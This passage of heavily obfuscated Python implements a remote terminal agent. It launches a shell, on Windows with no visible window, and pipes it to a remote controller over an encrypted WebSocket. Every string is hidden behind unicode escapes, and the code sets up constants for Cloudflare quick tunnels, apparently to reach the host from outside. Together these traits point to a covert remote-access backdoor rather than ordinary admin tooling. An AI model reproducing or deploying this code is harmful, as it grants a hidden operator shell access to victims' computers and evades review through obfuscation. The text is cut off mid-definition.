                if O0_var_346 is not None:
                    try:
                        os.close(O0_var_346)
                    except Exception:
                        pass
            self._in_r = self._in_w = self._out_r = self._out_w = None

        def kill_tree(self):
            _taskkill(self.pid)

    class _PipeTerminal:
        codecs.decode('\\u65e7\\u7248\\u0020\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u7ba1\\u9053\\u56de\\u9000\\u5b9e\\u73b0\\u0020\\u0028\\u65e0\\u0020\\u0043\\u006f\\u006e\\u0050\\u0054\\u0059\\u0029\\u003a\\u0020\\u65e0\\u771f\\u5b9e\\u7ec8\\u7aef\\u002c\\u0020\\u0072\\u0065\\u0073\\u0069\\u007a\\u0065\\u0020\\u4e3a\\u0020\\u006e\\u006f\\u002d\\u006f\\u0070', 'unicode_escape')

        def __init__(self, shell: str, env: Dict[str, str], O0_var_347: int, O0_var_348: int, cwd: str=None):
            self.shell = shell
            self.env = env
            self.cwd = cwd
            self._in_w = self._out_r = None
            self._proc = None
            self.pid = 0

        def start(self):
            O0_var_349, O0_var_350 = os.pipe()
            O0_var_351, O0_var_352 = os.pipe()
            self._proc = subprocess.Popen([self.shell], stdin=O0_var_349, stdout=O0_var_352, stderr=O0_var_352, env=self.env, cwd=self.cwd, creationflags=_CREATE_NO_WINDOW_FLAG)
            os.close(O0_var_349)
            os.close(O0_var_352)
            self._in_w = O0_var_350
            self._out_r = O0_var_351
            os.set_blocking(self._out_r, False)
            self.pid = self._proc.pid

        def set_size(self, O0_var_353: int, O0_var_354: int):
            return None

        def read(self, O0_var_355: int) -> bytes:
            if self._out_r is None:
                return b''
            try:
                return os.read(self._out_r, O0_var_355)
            except BlockingIOError:
                return None

        def write(self, data: bytes) -> int:
            if self._in_w is None:
                return 0
            return os.write(self._in_w, data)

        def close(self):
            for O0_var_356 in (self._in_w, self._out_r):
                if O0_var_356 is not None:
                    try:
                        os.close(O0_var_356)
                    except Exception:
                        pass
            self._in_w = self._out_r = None
            if self._proc is not None:
                try:
                    if self._proc.poll() is None:
                        self._proc.terminate()
                except Exception:
                    pass
                self._proc = None

        def kill_tree(self):
            _taskkill(self.pid)

    def _create_windows_backend(shell: str, env: Dict[str, str], O0_var_357: int, O0_var_358: int, cwd: str=None):
        if _KERNEL32 is not None:
            return _ConPtyTerminal(shell, env, O0_var_357, O0_var_358, cwd)
        return _PipeTerminal(shell, env, O0_var_357, O0_var_358, cwd)

    def _windows_default_shell() -> str:
        O0_var_359 = shutil.which(codecs.decode('\\u0070\\u006f\\u0077\\u0065\\u0072\\u0073\\u0068\\u0065\\u006c\\u006c\\u002e\\u0065\\u0078\\u0065', 'unicode_escape'))
        if O0_var_359:
            return O0_var_359
        O0_var_360 = os.environ.get(codecs.decode('\\u0043\\u004f\\u004d\\u0053\\u0050\\u0045\\u0043', 'unicode_escape'))
        if O0_var_360 and os.path.exists(O0_var_360):
            return O0_var_360
        return codecs.decode('\\u0063\\u006d\\u0064\\u002e\\u0065\\u0078\\u0065', 'unicode_escape')
else:

    def _windows_default_shell() -> str:
        return codecs.decode('', 'unicode_escape')

    def _create_windows_backend(*args, **kwargs):
        raise RuntimeError(codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u7ec8\\u7aef\\u540e\\u7aef\\u4ec5\\u652f\\u6301\\u0020\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u5e73\\u53f0', 'unicode_escape'))

class TerminalSessionHandler:

    def __init__(self):
        self.process = None
        self.master_fd = None
        self.slave_fd = None
        self.terminal = None
        self.websocket: WebSocket = None
        self.request_id: str = None
        self.AGENT_PRIVATE_KEY = Config.keys[codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape')].private_b64
        self.CONTROL_PUBLIC_KEY = Config.keys[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')].public_b64
        self.cipher = NoiseSessionWrapper(is_initiator=False, local_priv_b64=self.AGENT_PRIVATE_KEY, expected_remote_pub_b64=self.CONTROL_PUBLIC_KEY)

    def _read_key_file(self, O0_var_361: str) -> str:
        try:
            if os.path.exists(O0_var_361):
                with open(O0_var_361, codecs.decode('\\u0072', 'unicode_escape')) as O0_var_362:
                    return O0_var_362.read().strip()
            return None
        except Exception as e:
            Logger.error(codecs.decode('\\u8bfb\\u53d6\\u5bc6\\u94a5\\u6587\\u4ef6\\u0020', 'unicode_escape') + str(O0_var_361) + codecs.decode('\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))
            return None

    async def cleanup(self):
        if self.request_id:
            Logger.info(codecs.decode('\\u005b', 'unicode_escape') + str(self.request_id) + codecs.decode('\\u005d\\u0020\\u6267\\u884c\\u7ec8\\u7aef\\u8d44\\u6e90\\u6e05\\u7406\\u002e\\u002e\\u002e', 'unicode_escape'))
        O0_var_363 = getattr(self, codecs.decode('\\u0074\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c', 'unicode_escape'), None)
        if O0_var_363 is not None:
            O0_var_363.kill_tree()
            O0_var_363.close()
            self.terminal = None
        if self.process:
            try:
                if hasattr(os, codecs.decode('\\u006b\\u0069\\u006c\\u006c\\u0070\\u0067', 'unicode_escape')):
                    os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
                else:
                    self.process.terminate()
                try:
                    await asyncio.wait_for(self.process.wait(), timeout=2.0)
                except asyncio.TimeoutError:
                    self.process.kill()
            except Exception:
                pass
            self.process = None
        for O0_var_364 in [codecs.decode('\\u006d\\u0061\\u0073\\u0074\\u0065\\u0072\\u005f\\u0066\\u0064', 'unicode_escape'), codecs.decode('\\u0073\\u006c\\u0061\\u0076\\u0065\\u005f\\u0066\\u0064', 'unicode_escape')]:
            O0_var_365 = getattr(self, O0_var_364)
            if O0_var_365 is not None:
                try:
                    os.close(O0_var_365)
                except Exception:
                    pass
                setattr(self, O0_var_364, None)
        if self.websocket:
            try:
                await self.websocket.close(code=1000)
            except Exception:
                pass
            finally:
                self.websocket = None

    async def _do_noise_handshake(self, O0_var_366: WebSocket, O0_var_367):
        O0_var_367(codecs.decode('\\U0001f91d\\u0020\\u5f00\\u59cb\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u52a0\\u5bc6\\u63e1\\u624b\\u002e\\u002e\\u002e', 'unicode_escape'))
        try:
            O0_var_368 = await O0_var_366.receive_bytes()
            O0_var_369 = self.cipher.process_handshake(O0_var_368)
            await O0_var_366.send_bytes(O0_var_369)
            O0_var_370 = await O0_var_366.receive_bytes()
            self.cipher.process_handshake(O0_var_370)
            O0_var_371 = self.cipher.expected_remote_pub
            O0_var_372 = self.cipher.captured_remote_pub
            if not O0_var_371 or not O0_var_372 or (not hmac.compare_digest(O0_var_372, O0_var_371)):
                O0_var_367(codecs.decode('\\U0001f6a8\\u0020\\u7ec8\\u7aef\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u63e1\\u624b\\u5bf9\\u7aef\\u8eab\\u4efd\\u6821\\u9a8c\\u5931\\u8d25\\u002c\\u0020\\u62d2\\u7edd\\u4f1a\\u8bdd', 'unicode_escape'))
                try:
                    await O0_var_366.close(code=1008, reason=codecs.decode('\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u0070\\u0065\\u0065\\u0072\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'))
                except Exception:
                    pass
                raise PermissionError(codecs.decode('\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u0070\\u0065\\u0065\\u0072\\u0020\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'))
            O0_var_367(codecs.decode('\\u2705\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u63e1\\u624b\\u5b8c\\u6210\\uff0c\\u7aef\\u5230\\u7aef\\u52a0\\u5bc6\\u901a\\u9053\\u5df2\\u5efa\\u7acb\\uff01', 'unicode_escape'))
        except PermissionError as e:
            O0_var_367(codecs.decode('\\U0001f6a8\\u0020\\u62d2\\u7edd\\u8bbf\\u95ee\\u003a\\u0020', 'unicode_escape') + str(e))
            raise
        except Exception as e:
            O0_var_367(codecs.decode('\\U0001f4a5\\u0020\\u63e1\\u624b\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))
            raise RuntimeError(codecs.decode('\\u52a0\\u5bc6\\u63e1\\u624b\\u5931\\u8d25', 'unicode_escape'))

    async def start_session(self, O0_var_373: WebSocket, O0_var_374: str, O0_var_375: bool=True):
        self.websocket = O0_var_373
        self.request_id = O0_var_374
        self.use_noise = O0_var_375
        O0_var_376 = lambda msg: Logger.info(codecs.decode('\\u005b\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u0020', 'unicode_escape') + str(O0_var_374) + codecs.decode('\\u005d\\u0020', 'unicode_escape') + str(msg))
        O0_var_376(codecs.decode('\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u5df2\\u5efa\\u7acb\\uff0c\\u7b49\\u5f85\\u63a5\\u53d7\\u8fde\\u63a5\\u002e\\u002e\\u002e', 'unicode_escape'))
        try:
            await O0_var_373.accept()
            O0_var_376(codecs.decode('\\u2705\\u0020\\u0057\\u0065\\u0062\\u0053\\u006f\\u0063\\u006b\\u0065\\u0074\\u0020\\u8fde\\u63a5\\u5df2\\u63a5\\u53d7', 'unicode_escape'))
            if self.use_noise:
                await self._do_noise_handshake(O0_var_373, O0_var_376)
            else:
                O0_var_376(codecs.decode('\\u26a1\\u0020\\u8d70\\u0020\\u0048\\u0054\\u0054\\u0050\\u0053\\u0020\\u660e\\u6587\\u964d\\u7ea7\\u901a\\u9053\\uff0c\\u8df3\\u8fc7\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u63e1\\u624b\\u3002', 'unicode_escape'))
            await self._run_terminal(O0_var_373, O0_var_374, O0_var_376)
        except WebSocketDisconnect:
            O0_var_376(codecs.decode('\\U0001f50c\\u0020\\u5ba2\\u6237\\u7aef\\u4e3b\\u52a8\\u65ad\\u5f00\\u8fde\\u63a5', 'unicode_escape'))
        except Exception as e:
            O0_var_376(codecs.decode('\\u274c\\u0020\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u5f02\\u5e38\\u003a\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u0020\\u002d\\u0020', 'unicode_escape') + str(e))
        finally:
            await self.cleanup()
            O0_var_376(codecs.decode('\\u2705\\u0020\\u8d44\\u6e90\\u6e05\\u7406\\u5b8c\\u6bd5\\u003a\\u0020', 'unicode_escape') + str(O0_var_374))

    @staticmethod
    def get_available_shell():
        if _IS_WINDOWS:
            return _windows_default_shell()
        for O0_var_377 in [codecs.decode('\\u0062\\u0061\\u0073\\u0068', 'unicode_escape'), codecs.decode('\\u007a\\u0073\\u0068', 'unicode_escape'), codecs.decode('\\u0061\\u0073\\u0068', 'unicode_escape')]:
            O0_var_378 = shutil.which(O0_var_377)
            if O0_var_378:
                return O0_var_378
        O0_var_379 = os.environ.get(codecs.decode('\\u0053\\u0048\\u0045\\u004c\\u004c', 'unicode_escape'))
        if O0_var_379 and os.path.exists(O0_var_379) and os.access(O0_var_379, os.X_OK):
            return O0_var_379
        return shutil.which(codecs.decode('\\u0073\\u0068', 'unicode_escape')) or codecs.decode('\\u002f\\u0062\\u0069\\u006e\\u002f\\u0073\\u0068', 'unicode_escape')

    def set_pty_size(self, O0_var_380: int, O0_var_381: int):
        O0_var_382 = getattr(self, codecs.decode('\\u0074\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c', 'unicode_escape'), None)
        if O0_var_382 is not None:
            O0_var_382.set_size(O0_var_380, O0_var_381)
            return
        if self.master_fd is not None:
            try:
                O0_var_383 = struct.pack(codecs.decode('\\u0048\\u0048\\u0048\\u0048', 'unicode_escape'), O0_var_380, O0_var_381, 0, 0)
                fcntl.ioctl(self.master_fd, termios.TIOCSWINSZ, O0_var_383)
            except Exception as e:
                Logger.warning(codecs.decode('\\u8bbe\\u7f6e\\u0020\\u0050\\u0054\\u0059\\u0020\\u5c3a\\u5bf8\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))

    async def _run_terminal(self, O0_var_384: WebSocket, O0_var_385: str, O0_var_386):
        self.master_fd = None
        self.slave_fd = None
        try:
            O0_var_387 = os.environ.copy()
            O0_var_387.pop(codecs.decode('\\u0050\\u0052\\u004f\\u004d\\u0050\\u0054\\u005f\\u0043\\u004f\\u004d\\u004d\\u0041\\u004e\\u0044', 'unicode_escape'), None)
            O0_var_387.setdefault(codecs.decode('\\u0054\\u0045\\u0052\\u004d', 'unicode_escape'), codecs.decode('\\u0078\\u0074\\u0065\\u0072\\u006d\\u002d\\u0032\\u0035\\u0036\\u0063\\u006f\\u006c\\u006f\\u0072', 'unicode_escape'))
            if codecs.decode('\\u004c\\u0041\\u004e\\u0047', 'unicode_escape') not in O0_var_387:
                O0_var_387[codecs.decode('\\u004c\\u0041\\u004e\\u0047', 'unicode_escape')] = codecs.decode('\\u0043\\u002e\\u0055\\u0054\\u0046\\u002d\\u0038', 'unicode_escape')
            if _IS_WINDOWS:
                await self._run_terminal_windows(O0_var_384, O0_var_385, O0_var_386, O0_var_387)
                return
            self.master_fd, self.slave_fd = pty.openpty()
            self.set_pty_size(24, 80)
            O0_var_388 = self.get_available_shell()
            O0_var_386(codecs.decode('\\U0001f41a\\u0020\\u4f7f\\u7528\\u0020\\u0053\\u0068\\u0065\\u006c\\u006c\\u0020\\u8def\\u5f84\\u003a\\u0020', 'unicode_escape') + str(O0_var_388))

            def pty_preexec():
                import termios, fcntl
                os.setsid()
                try:
                    fcntl.ioctl(0, termios.TIOCSCTTY, 0)
                except Exception:
                    pass
            self.process = await asyncio.create_subprocess_exec(O0_var_388, stdin=self.slave_fd, stdout=self.slave_fd, stderr=self.slave_fd, env=O0_var_387, preexec_fn=pty_preexec)
            O0_var_386(codecs.decode('\\U0001f680\\u0020\\u7ec8\\u7aef\\u8fdb\\u7a0b\\u5df2\\u542f\\u52a8\\u0020\\u0028\\u0050\\u0049\\u0044\\u003a\\u0020', 'unicode_escape') + str(self.process.pid) + codecs.decode('\\u0029', 'unicode_escape'))
            if self.slave_fd is not None:
                os.close(self.slave_fd)
                self.slave_fd = None
            O0_var_389 = fcntl.fcntl(self.master_fd, fcntl.F_GETFL)
            fcntl.fcntl(self.master_fd, fcntl.F_SETFL, O0_var_389 | os.O_NONBLOCK)
            O0_var_390 = [asyncio.create_task(self._handle_pty_output(O0_var_384, self.master_fd, O0_var_386)), asyncio.create_task(self._handle_websocket_input(O0_var_384, self.master_fd, O0_var_386)), asyncio.create_task(self._monitor_process(self.process, O0_var_386))]
            O0_var_391, O0_var_392 = await asyncio.wait(O0_var_390, return_when=asyncio.FIRST_COMPLETED)
            for O0_var_393 in O0_var_392:
                O0_var_393.cancel()
            try:
                await O0_var_384.close(code=1000, reason=codecs.decode('\\u0054\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c\\u0020\\u0065\\u0078\\u0069\\u0074\\u0065\\u0064\\u0020\\u006e\\u006f\\u0072\\u006d\\u0061\\u006c\\u006c\\u0079', 'unicode_escape'))
            except Exception:
                pass
        except Exception as e:
            O0_var_386(codecs.decode('\\U0001f4a5\\u0020\\u542f\\u52a8\\u7ec8\\u7aef\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u0020\\u002d\\u0020', 'unicode_escape') + str(str(e)))
            await self.cleanup()
            raise

    async def _run_terminal_windows(self, O0_var_394: WebSocket, O0_var_395: str, O0_var_396, env: dict):
        try:
            O0_var_397 = self.get_available_shell()
            O0_var_396(codecs.decode('\\U0001f41a\\u0020\\u4f7f\\u7528\\u0020\\u0053\\u0068\\u0065\\u006c\\u006c\\u0020\\u8def\\u5f84\\u003a\\u0020', 'unicode_escape') + str(O0_var_397))
            O0_var_398 = _resolve_safe_cwd()
            O0_var_399 = _create_windows_backend(O0_var_397, env, 24, 80, O0_var_398)
            O0_var_399.start()
            self.terminal = O0_var_399
            self.process = None
            O0_var_396(codecs.decode('\\U0001f680\\u0020\\u7ec8\\u7aef\\u8fdb\\u7a0b\\u5df2\\u542f\\u52a8\\u0020\\u0028\\u0050\\u0049\\u0044\\u003a\\u0020', 'unicode_escape') + str(O0_var_399.pid) + codecs.decode('\\u0029', 'unicode_escape'))
            O0_var_400 = [asyncio.create_task(self._handle_windows_output(O0_var_394, O0_var_399, O0_var_396)), asyncio.create_task(self._handle_websocket_input(O0_var_394, O0_var_399, O0_var_396))]
            O0_var_401, O0_var_402 = await asyncio.wait(O0_var_400, return_when=asyncio.FIRST_COMPLETED)
            for O0_var_403 in O0_var_402:
                O0_var_403.cancel()
            try:
                await O0_var_394.close(code=1000, reason=codecs.decode('\\u0054\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c\\u0020\\u0065\\u0078\\u0069\\u0074\\u0065\\u0064\\u0020\\u006e\\u006f\\u0072\\u006d\\u0061\\u006c\\u006c\\u0079', 'unicode_escape'))
            except Exception:
                pass
        except Exception as e:
            O0_var_396(codecs.decode('\\U0001f4a5\\u0020\\u542f\\u52a8\\u7ec8\\u7aef\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u0020\\u002d\\u0020', 'unicode_escape') + str(str(e)))
            await self.cleanup()
            raise

    @staticmethod
    def _write_terminal(target, data: bytes):
        if isinstance(target, int):
            os.write(target, data)
        else:
            target.write(data)

    async def _handle_windows_output(self, O0_var_404: WebSocket, O0_var_405, O0_var_406):
        O0_var_407 = asyncio.get_running_loop()
        O0_var_408 = asyncio.Queue()
        O0_var_409 = threading.Event()

        def reader():
            while not O0_var_409.is_set():
                try:
                    O0_var_410 = O0_var_405.read(8192)
                except OSError:
                    break
                if O0_var_410 is None:
                    time.sleep(0.01)
                    continue
                if not O0_var_410:
                    break
                O0_var_407.call_soon_threadsafe(O0_var_408.put_nowait, O0_var_410)
            O0_var_407.call_soon_threadsafe(O0_var_408.put_nowait, None)
        O0_var_411 = threading.Thread(target=reader, daemon=True, name=codecs.decode('\\u0063\\u006f\\u006e\\u0070\\u0074\\u0079\\u002d\\u0072\\u0065\\u0061\\u0064\\u0065\\u0072\\u002d', 'unicode_escape') + str(self.request_id))
        O0_var_411.start()
        try:
            while True:
                O0_var_412 = await O0_var_408.get()
                if O0_var_412 is None:
                    break
                if self.use_noise:
                    O0_var_413 = self.cipher.encrypt(O0_var_412)
                else:
                    O0_var_413 = O0_var_412
                await O0_var_404.send_bytes(O0_var_413)
        except (WebSocketDisconnect, ConnectionResetError, OSError):
            pass
        finally:
            O0_var_409.set()
            O0_var_406(codecs.decode('\\U0001f50c\\u0020\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u7ec8\\u7aef\\u8f93\\u51fa\\u5faa\\u73af\\u7ed3\\u675f', 'unicode_escape'))

    async def _handle_pty_output(self, O0_var_414: WebSocket, O0_var_415: int, O0_var_416):
        try:
            while True:
                if O0_var_415 is None:
                    break
                O0_var_417, O0_var_418, O0_var_418 = select.select([O0_var_415], [], [], 0.1)
                if O0_var_415 in O0_var_417:
                    try:
                        O0_var_419 = os.read(O0_var_415, 8192)
                        if not O0_var_419:
                            break
                        if self.use_noise:
                            O0_var_420 = self.cipher.encrypt(O0_var_419)
                            await O0_var_414.send_bytes(O0_var_420)
                        else:
                            await O0_var_414.send_bytes(O0_var_419)
                    except BlockingIOError:
                        await asyncio.sleep(0.01)
                    except OSError as e:
                        if e.errno == 5:
                            break
                        raise
                else:
                    await asyncio.sleep(0.01)
        except (OSError, WebSocketDisconnect, ConnectionResetError):
            pass

    async def _handle_websocket_input(self, O0_var_421: WebSocket, O0_var_422: int, O0_var_423):
        try:
            async for O0_var_424 in O0_var_421.iter_bytes():
                if O0_var_422 is None:
                    break
                if self.use_noise:
                    try:
                        O0_var_425 = self.cipher.decrypt(O0_var_424)
                    except Exception as e:
                        O0_var_423(codecs.decode('\\u26a0\\ufe0f\\u0020\\u89e3\\u5bc6\\u5931\\u8d25\\uff0c\\u6536\\u5230\\u975e\\u6cd5\\u5305\\u003a\\u0020', 'unicode_escape') + str(e))
                        break
                else:
                    O0_var_425 = O0_var_424
                try:
                    O0_var_426 = O0_var_425.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                    if O0_var_426.strip().startswith(codecs.decode('\\u007b', 'unicode_escape')):
                        O0_var_427 = json.loads(O0_var_426)
                        O0_var_428 = O0_var_427.get(codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'))
                        if O0_var_428 == codecs.decode('\\u0068\\u0065\\u0061\\u0072\\u0074\\u0062\\u0065\\u0061\\u0074', 'unicode_escape'):
                            O0_var_429 = json.dumps({codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0065\\u0061\\u0072\\u0074\\u0062\\u0065\\u0061\\u0074', 'unicode_escape')}).encode()
                            if self.use_noise:
                                await O0_var_421.send_bytes(self.cipher.encrypt(O0_var_429))
                            else:
                                await O0_var_421.send_bytes(O0_var_429)
                            continue
                        if O0_var_428 == codecs.decode('\\u0072\\u0065\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'):
                            O0_var_430, O0_var_431 = (O0_var_427.get(codecs.decode('\\u0072\\u006f\\u0077\\u0073', 'unicode_escape'), 24), O0_var_427.get(codecs.decode('\\u0063\\u006f\\u006c\\u0073', 'unicode_escape'), 80))
                            self.set_pty_size(O0_var_430, O0_var_431)
                            continue
                        if O0_var_428 == codecs.decode('\\u0069\\u006e\\u0070\\u0075\\u0074', 'unicode_escape') and codecs.decode('\\u0064\\u0061\\u0074\\u0061', 'unicode_escape') in O0_var_427:
                            O0_var_432 = O0_var_427[codecs.decode('\\u0064\\u0061\\u0074\\u0061', 'unicode_escape')]
                            if O0_var_427.get(codecs.decode('\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape')) == codecs.decode('\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034', 'unicode_escape'):
                                O0_var_433 = base64.b64decode(O0_var_432)
                            else:
                                O0_var_433 = O0_var_432.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                            self._write_terminal(O0_var_422, O0_var_433)
                            continue
                except (UnicodeDecodeError, json.JSONDecodeError):
                    pass
                self._write_terminal(O0_var_422, O0_var_425)
        except WebSocketDisconnect:
            O0_var_423(codecs.decode('\\U0001f50c\\u0020\\u5ba2\\u6237\\u7aef\\u65ad\\u5f00\\uff0c\\u505c\\u6b62\\u63a5\\u6536\\u8f93\\u5165', 'unicode_escape'))
        except OSError:
            pass

    async def _monitor_process(self, O0_var_434, O0_var_435):
        try:
            await O0_var_434.wait()
        except Exception:
            pass
QUICK_SERVICE = codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0061\\u0070\\u0069\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')
EDGE_HOSTS = (codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u006f\\u006e\\u0031\\u002e\\u0076\\u0032\\u002e\\u0061\\u0072\\u0067\\u006f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u006f\\u006e\\u0032\\u002e\\u0076\\u0032\\u002e\\u0061\\u0072\\u0067\\u006f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'))
EDGE_PORT = 7844
CONTROL_HEADER = codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u002d\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape')
CONTROL_STREAM = codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u002d\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')
UPDATE_CONFIGURATION = codecs.decode('\\u0075\\u0070\\u0064\\u0061\\u0074\\u0065\\u002d\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u0075\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape')
MAX_FRAME_SIZE = 16384
STATIC_TABLE = ((codecs.decode('\\u003a\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u003a\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'), codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape')), (codecs.decode('\\u003a\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'), codecs.decode('\\u0050\\u004f\\u0053\\u0054', 'unicode_escape')), (codecs.decode('\\u003a\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u002f', 'unicode_escape')), (codecs.decode('\\u003a\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u002f\\u0069\\u006e\\u0064\\u0065\\u0078\\u002e\\u0068\\u0074\\u006d\\u006c', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0063\\u0068\\u0065\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0063\\u0068\\u0065\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0030', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0034', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0036', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0033\\u0030\\u0034', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0034\\u0030\\u0030', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0034\\u0030\\u0034', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0035\\u0030\\u0030', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0067\\u007a\\u0069\\u0070\\u002c\\u0020\\u0064\\u0065\\u0066\\u006c\\u0061\\u0074\\u0065', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u006c\\u0061\\u006e\\u0067\\u0075\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u0072\\u0061\\u006e\\u0067\\u0065\\u0073', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0073\\u0073\\u002d\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u002d\\u0061\\u006c\\u006c\\u006f\\u0077\\u002d\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u006c\\u006c\\u006f\\u0077', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), 